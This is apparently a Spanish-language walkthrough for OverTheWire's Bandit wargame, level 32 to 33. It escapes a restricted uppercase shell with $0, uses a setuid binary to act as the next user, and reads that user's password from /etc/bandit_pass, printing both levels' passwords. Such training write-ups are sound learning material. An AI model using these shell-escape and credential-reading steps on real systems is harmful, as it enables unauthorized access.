# Bandit Level 32 → Level 33

## Objetivo
Después de todo esto, es hora de otro escape. ¡Buena suerte!

## Datos de acceso al nivel
* Servidor: ssh bandit32@bandit.labs.overthewire.org
* Usuario: bandit32
* Contraseña: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y

## Solución
``` bash 
  Enjoy your stay!

WELCOME TO THE UPPERCASE SHELL
>> clear
sh: 1: CLEAR: not found
>> whoami
sh: 1: WHOAMI: not found
>> $0
$ pwd
/home/bandit32
$ whoami
bandit33
$ ls -la
total 36
drwxr-xr-x  2 root     root      4096 Feb 21 22:03 .
drwxr-xr-x 70 root     root      4096 Feb 21 22:04 ..
-rw-r--r--  1 root     root       220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root     root      3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root     root       807 Jan  6  2022 .profile
-rwsr-x---  1 bandit33 bandit32 15128 Feb 21 22:03 uppershell
$ cd /etc
$ ls
NetworkManager                 group                       lsb-release                          services
'bandit_pass'                    hosts.allow                 modules                 shadow
bash.bashrc                    hosts.deny                  modules-load.d          
$ cat /etc/bandit_pass
cat: /etc/bandit_pass: Is a directory
$ cat /etc/bandit_pass/bandit33
'odHo63fHiFqcWWJG9rLiLDtPm45KzUKy'
$
```
## Notas Adicionales
|Comando | Descripcion |
|-----|-------|
| $0 | Convierte una terminal uppercase a una shell. |
| whoami | Muestra el nombre de usuario del usuario actual. | 
| pwd | Imprime la ruta del directorio de trabajo, comenzando desde la raíz. | 

## Referencias
* [whoami](https://www.geeksforgeeks.org/whoami-command-linux-example/)
* [pdw](https://www.geeksforgeeks.org/pwd-command-in-linux-with-examples/)

Fecha: 04/03/2023.